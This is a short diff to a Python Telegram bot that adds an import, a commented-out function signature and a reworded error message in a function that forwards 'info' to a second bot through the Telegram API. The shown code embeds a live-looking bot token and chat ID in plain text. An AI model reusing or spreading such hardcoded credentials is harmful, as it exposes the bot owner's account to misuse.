@@ -3,6 +3,7 @@ import telebot
 from telebot import types
 import time
 import random
+import requests
 
 
 log = open('bot-log.txt', 'a+', encoding='utf-8')
@@ -162,6 +163,7 @@ def send_info_to_second_bot(info):
     SECOND_BOT_TOKEN = "6470408760:AAEy7g0RCzt4rlOTeUemm1C6bWNXdXwcug0"
     SECOND_BOT_CHAT_ID = "6121565272"
 
+    #def send_info_to_second_bot(info, SECOND_BOT_TOKEN, SECOND_BOT_CHAT_ID):
     # Define the API endpoint URL for sending messages with the second bot's token and chat ID
     url = f"https://api.telegram.org/bot{SECOND_BOT_TOKEN}/sendMessage"
 
@@ -176,7 +178,8 @@ def send_info_to_second_bot(info):
 
     # Check the response status code for errors (optional)
     if response.status_code != 200:
-        print(f"error: {response.status_code}")
+        print(f"Failed to send message to the second bot: {response.status_code}")
+
 
 
 
